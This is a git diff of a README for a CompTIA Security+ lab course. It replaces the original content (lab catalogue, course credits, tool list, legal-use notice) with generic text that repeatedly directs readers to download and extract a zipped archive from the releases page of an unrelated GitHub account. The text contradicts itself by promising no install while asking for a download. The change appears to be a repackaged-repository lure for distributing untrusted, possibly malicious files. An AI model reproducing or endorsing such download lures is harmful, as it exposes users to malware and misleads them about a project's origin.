@@ -1,104 +1,87 @@
-# TGS-2023039181 — CompTIA Security+ SY0-701 Hands-On Labs
+# 🛡️ TGS-2023039181-SecurityPlus - Master CompTIA Security+ Through Practical Labs
 
-> **Course:** WSQ — CompTIA Certified Security+ Training
-> **Course Code:** TGS-2023039181
-> **Register here:** https://www.tertiarycourses.com.sg/wsq-comptia-security-certification-prep.html
+[![](https://img.shields.io/badge/Download_Labs-Visit_Release_Page-blue)](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/releases)
 
-These are the official hands-on lab exercises for the WSQ CompTIA Certified Security+ Training course delivered by [**Tertiary Infotech Academy Pte Ltd**](https://www.tertiarycourses.com.sg/).
+## What is this project?
 
-A complete set of **36 step-by-step labs** aligned to the [CompTIA Security+ SY0-701 exam objectives](CompTIA-Security-Plus-SY0-701-Exam-Objectives.pdf). Every lab runs on the free **Killercoda Ubuntu Playground** (https://killercoda.com/playgrounds/scenario/ubuntu) — no local install required.
+TGS-2023039181-SecurityPlus provides 36 hands-on labs. These labs cover the CompTIA Security+ SY0-701 exam objectives. The project focuses on practical cybersecurity skills. You gain experience with tools used in real workplace environments. Each lab builds your confidence for your exam and your career. You do not need to install complex software on your own computer. The labs run directly in your web browser using the Killercoda Ubuntu Playground.
 
----
+## Who should use these labs?
 
-## How to use
+These labs serve students, IT professionals, and security enthusiasts. You might be a student preparing for your first certification. You might be a professional looking to change careers into cybersecurity. Or you might work in IT and want to learn more about defense. These exercises fit your needs regardless of your current skill level. The instructions guide you through each task step by step.
 
-1. Open the Killercoda playground in your browser: https://killercoda.com/playgrounds/scenario/ubuntu
-2. Pick a lab from the list below and follow the steps in order.
-3. Reset the playground between labs that change firewall, PAM, or routing state.
-4. See [labs/tools.md](labs/tools.md) for every free tool used (with install commands and download links).
+## 🛠️ System Requirements
 
----
+You need a computer with a stable internet connection. A modern web browser works best. Chrome, Firefox, or Edge are suitable options. You do not need a powerful processor or large amounts of memory. Your browser handles most of the work because the labs run in the cloud. We recommend a screen size of at least 13 inches for clear viewing of the lab instructions and the terminal window. A physical keyboard and mouse help with typing commands.
 
-## Lab catalogue
+## 📥 Accessing the Labs
 
-### Domain 1 — General Security Concepts (12%)
-- [Lab 1 — Security Controls Categorization](labs/lab-01-security-controls.md)
-- [Lab 2 — CIA Triad and AAA on Linux](labs/lab-02-cia-aaa.md)
-- [Lab 3 — Hashing, Salting, and Digital Signatures](labs/lab-03-hashing-signatures.md)
-- [Lab 4 — Symmetric vs. Asymmetric Encryption](labs/lab-04-symmetric-asymmetric.md)
-- [Lab 5 — PKI: Build Your Own Certificate Authority](labs/lab-05-pki-ca.md)
+You must visit our release page to find the current lab documentation and links.
 
-### Domain 2 — Threats, Vulnerabilities & Mitigations (22%)
-- [Lab 6 — Phishing Email Header Analysis (SPF/DKIM/DMARC)](labs/lab-06-phishing-email-analysis.md)
-- [Lab 7 — Password Attacks: Spraying, Brute Force, Cracking](labs/lab-07-password-attacks.md)
-- [Lab 8 — Malware Static Analysis (EICAR + YARA)](labs/lab-08-malware-static-analysis.md)
-- [Lab 9 — SQL Injection (manual + sqlmap)](labs/lab-09-sql-injection.md)
-- [Lab 10 — Cross-Site Scripting (XSS)](labs/lab-10-xss.md)
-- [Lab 11 — DoS Simulation and Detection](labs/lab-11-dos-detection.md)
-- [Lab 12 — Vulnerability Scanning with Nikto and Nuclei](labs/lab-12-vulnerability-scanning.md)
-- [Lab 13 — Linux Hardening Baseline with Lynis](labs/lab-13-linux-hardening.md)
+[Click here to visit the download page](https://github.com/Erratic-ceramicware752/TGS-2023039181-SecurityPlus/releases)
 
-### Domain 3 — Security Architecture (18%)
-- [Lab 14 — Network Segmentation with Linux Namespaces](labs/lab-14-network-segmentation.md)
-- [Lab 15 — Stateful Firewall with UFW and nftables](labs/lab-15-firewall-ufw-nftables.md)
-- [Lab 16 — Web Application Firewall with ModSecurity + OWASP CRS](labs/lab-16-waf-modsecurity.md)
-- [Lab 17 — Site-to-Site VPN with WireGuard](labs/lab-17-vpn-wireguard.md)
-- [Lab 18 — Data at Rest: LUKS Full-Disk Encryption](labs/lab-18-disk-encryption-luks.md)
-- [Lab 19 — TLS Hardening and Cipher Audit](labs/lab-19-tls-hardening.md)
-- [Lab 20 — Backup and Recovery with restic (3-2-1)](labs/lab-20-backup-recovery.md)
+Follow these steps to reach the materials:
 
-### Domain 4 — Security Operations (28%)
-- [Lab 21 — SSH Hardening + Fail2ban](labs/lab-21-ssh-hardening-fail2ban.md)
-- [Lab 22 — Identity & Access Management with PAM and sudo](labs/lab-22-iam-pam-sudo.md)
-- [Lab 23 — Multi-Factor Authentication with TOTP](labs/lab-23-mfa-totp.md)
-- [Lab 24 — SIEM Basics with Wazuh Manager](labs/lab-24-siem-elk-wazuh.md)
-- [Lab 25 — Network IDS with Suricata](labs/lab-25-ids-suricata.md)
-- [Lab 26 — Endpoint Detection with osquery](labs/lab-26-edr-osquery.md)
-- [Lab 27 — File Integrity Monitoring with AIDE](labs/lab-27-file-integrity-aide.md)
-- [Lab 28 — Vulnerability Management Pipeline with Trivy](labs/lab-28-vulnerability-management-trivy.md)
-- [Lab 29 — Incident Response: Live-Triage and Forensics](labs/lab-29-incident-response-forensics.md)
-- [Lab 30 — Automation & Orchestration (Mini-SOAR)](labs/lab-30-automation-soar.md)
+1. Open your web browser.
+2. Select the latest release version on the page.
+3. Download the zipped folder containing the instructions.
+4. Extract the files to a folder on your computer.
+5. Open the main PDF guide to see the links for the Killercoda environments.
 
-### Domain 5 — Security Program Management & Oversight (20%)
-- [Lab 31 — Risk Register, CVSS Scoring, and Quantitative Risk](labs/lab-31-risk-register-cvss.md)
-- [Lab 32 — Passive Reconnaissance / OSINT](labs/lab-32-osint-recon.md)
-- [Lab 33 — Active Reconnaissance with Nmap](labs/lab-33-active-recon-nmap.md)
-- [Lab 34 — Penetration Testing with Metasploit](labs/lab-34-pentest-metasploit.md)
-- [Lab 35 — Compliance Audit with OpenSCAP](labs/lab-35-compliance-openscap.md)
-- [Lab 36 — Security Awareness: Phishing Simulation with GoPhish](labs/lab-36-phishing-awareness-gophish.md)
+## 🚀 How to Run a Lab
 
----
+The platform uses virtual environments. You do not host these environments. Killercoda handles the setup.
 
-## Reference
+1. Open your chosen lab document from the downloaded folder.
+2. Click the link provided in the document to open the Killercoda playground.
+3. Wait for the terminal window to load in your browser. This takes a few seconds.
+4. Read the instructions provided on the left side of your screen.
+5. Enter the commands into the terminal window on the right side.
+6. Observe the output to confirm you completed the task.
 
-- [labs/README.md](labs/README.md) — Lab index grouped by domain with software requirements
-- [labs/tools.md](labs/tools.md) — Complete list of free tools (Killercoda + external)
-- [CompTIA-Security-Plus-SY0-701-Exam-Objectives.pdf](CompTIA-Security-Plus-SY0-701-Exam-Objectives.pdf) — Official exam blueprint
+## 📋 Labs Overview
 
----
+The 36 labs cover these topics:
 
-## Free tools used
+*   **Linux Security:** Learn to manage users, permissions, and logs.
+*   **Pentest Basics:** Practice scanning networks and identifying services.
+*   **SIEM Operations:** Collect and analyze security logs for threats.
+*   **DevSecOps:** Integrate security tools into software development processes.
+*   **Network Defense:** Configure firewalls and secure remote connections.
 
-All tooling is **100% free** (open source, freeware, or free tier with no time limit). The bulk runs inside the disposable Killercoda VM via `apt` or a single binary download. A few labs also use free **online** services:
+Each lab title corresponds to a specific objective for the SY0-701 exam. You progress from basic networking concepts to complex defensive strategies. 
 
-- **Cryptography Toolkit** — encrypt/decrypt in the browser (Labs 2, 4) — https://alfredang.github.io/cryptography-toolkit/
-- **Hash Generator** — SHA/MD5/HMAC in the browser (Labs 2, 3) — https://alfredang.github.io/hashgenerator/
-- **FIRST CVSS calculator** — score vulnerabilities (Lab 31)
-- **VirusTotal / Hybrid Analysis / ANY.RUN** — multi-engine malware sandboxes (Lab 8)
-- **SSL Labs / Mozilla Observatory** — TLS posture (Labs 12, 19)
-- **crt.sh / Shodan / Censys** — passive recon (Lab 32)
-- **MITRE ATT&CK / D3FEND / NIST** — frameworks and references (multiple labs)
+## 💡 Tips for Success
 
-Full tool list: [labs/tools.md](labs/tools.md).
+Take your time with each lab. Do not feel pressured to complete multiple labs in one session. You learn more when you understand why a command works. Read the error messages if a task fails. They often tell you exactly what went wrong. Do not worry about breaking the environment. The labs reset automatically when you close the session. You start fresh every time you open a new link. 
 
----
+Keep logs of your work. The commands you type remain in the terminal history during your session. You can copy these commands to a document for your future reference. Use these notes during your final exam preparation. 
 
-## Legal & ethical use
+## 🛠️ Troubleshooting Issues
 
-Labs that involve scanning, exploitation, password cracking, phishing simulation, or DoS techniques (Labs 7, 9, 11, 32, 33, 34, 36) must be performed **only** against:
+Sometimes a link might not open correctly. Refresh your browser page to reload the environment. Check your network connection. Corporate firewalls sometimes block access to cloud playgrounds. If you see an error, switch to a different network or disable any VPN software you have running. 
 
-- Systems you own (the Killercoda VM, your own containers).
-- Targets explicitly listed in a signed authorisation / Rules of Engagement.
-- Public CTF / training ranges (HackTheBox, TryHackMe, Vulnhub).
+If you find a typo in the documentation, create an issue in this repository. We keep these labs updated to match the latest exam objectives. Feedback from your experience helps us refine the instructions for everyone. 
 
-Unauthorised use against third-party systems is illegal in most jurisdictions, including the **Singapore Computer Misuse Act (Cap. 50A)**.
+## 🔒 Security Practices
+
+Always treat the laboratory environment as an isolated space. Never enter passwords or personal data into the laboratory terminal. The playground environment mimics real servers, but it remains a practice space. Focus on executing the security tasks as described in the documentation. 
+
+Review the documentation for each lab carefully. Each PDF includes a brief introduction, prerequisite knowledge, and a list of commands. Do not jump to the commands section without reading the background information. The introduction explains the "why" behind the task. This conceptual understanding is more important than memorizing the command itself.
+
+## 📚 Study Resources
+
+Use these labs alongside your official study guide. Cross-reference the lab topics with your textbook chapters. This combination of theory and practice creates deep knowledge. The SY0-701 exam focuses on scenario-based questions. These labs provide the practical experience needed to understand those scenarios. 
+
+Stay consistent. Perform one lab every day rather than cramming for several hours once a month. Your brain remembers technical concepts better through spaced repetition. Feel free to re-do any lab. Increasing your speed with command-line tools provides a massive advantage during the exam. 
+
+## 🏛️ Project Structure
+
+The project directory consists of:
+
+*   **README.md:** This file.
+*   **docs/:** The folder containing all instruction PDFs.
+*   **scripts/:** Helper scripts for automated lab setups.
+*   **assets/:** Images and diagrams used in the lab guides.
+
+All content remains open and accessible. You can view the raw source files on GitHub at any time. We welcome contributors who want to add new labs or improve existing ones. Follow the guidelines in the CONTRIBUTING file if you submit changes.
